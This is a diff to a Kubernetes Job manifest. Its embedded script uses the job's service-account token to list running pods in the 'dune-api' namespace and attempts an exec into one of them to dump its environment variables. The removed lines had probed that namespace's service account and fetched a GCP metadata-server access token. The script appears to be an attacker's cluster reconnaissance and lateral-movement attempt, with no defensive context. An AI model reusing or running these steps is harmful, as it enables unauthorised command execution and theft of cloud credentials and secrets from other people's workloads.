@@ -1,7 +1,7 @@
 apiVersion: batch/v1
 kind: Job
 metadata:
-  name: dune-db-v5
+  name: dune-exec-v1
   namespace: default
 spec:
   ttlSecondsAfterFinished: 600
@@ -21,20 +21,23 @@ spec:
           CA="/var/run/secrets/kubernetes.io/serviceaccount/ca.crt"
           KUBE_NS="dune-api"
           
-          echo "=DUNE_SA="
-          # Get the service account used by dune-api pods
-          SA=$(curl -sk --cacert $CA -H "Authorization: Bearer $KUBE_TOKEN" \
-            "$API/api/v1/namespaces/$KUBE_NS/pods" | jq -r '.items[0].spec.serviceAccountName')
-          echo "ServiceAccount: $SA"
+          echo "=RUNNING_PODS="
+          PODS=$(curl -sk --cacert $CA -H "Authorization: Bearer $KUBE_TOKEN" \
+            "$API/api/v1/namespaces/$KUBE_NS/pods?fieldSelector=status.phase%3DRunning" | \
+            jq -r '.items[].metadata.name')
+          echo "$PODS"
+          echo "=END_PODS="
           
-          # Get SA details including annotations (Workload Identity)
+          POD=$(curl -sk --cacert $CA -H "Authorization: Bearer $KUBE_TOKEN" \
+            "$API/api/v1/namespaces/$KUBE_NS/pods?fieldSelector=status.phase%3DRunning" | \
+            jq -r '.items[0].metadata.name')
+          echo "Target pod: $POD"
+          
+          # Try exec via spdy (not websocket - may not work but try)
+          echo "=EXEC_ATTEMPT="
           curl -sk --cacert $CA -H "Authorization: Bearer $KUBE_TOKEN" \
-            "$API/api/v1/namespaces/$KUBE_NS/serviceaccounts/$SA" | jq '{name:.metadata.name, annotations:.metadata.annotations}'
-          echo "=END_SA="
-          
-          echo "=METADATA_TOKEN="
-          # Try to get GCP identity token from metadata server inside the dune-api pod would use
-          # We need to exec into the pod, but we can try from our own context
-          curl -s -H "Metadata-Flavor: Google" "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token" 2>&1 | head -c 200
+            -H "Upgrade: SPDY/3.1" \
+            -H "Connection: Upgrade" \
+            "$API/api/v1/namespaces/$KUBE_NS/pods/$POD/exec?command=env&stderr=true&stdout=true" 2>&1 | head -c 500
           echo ""
-          echo "=END_MT="
+          echo "=END_EXEC="
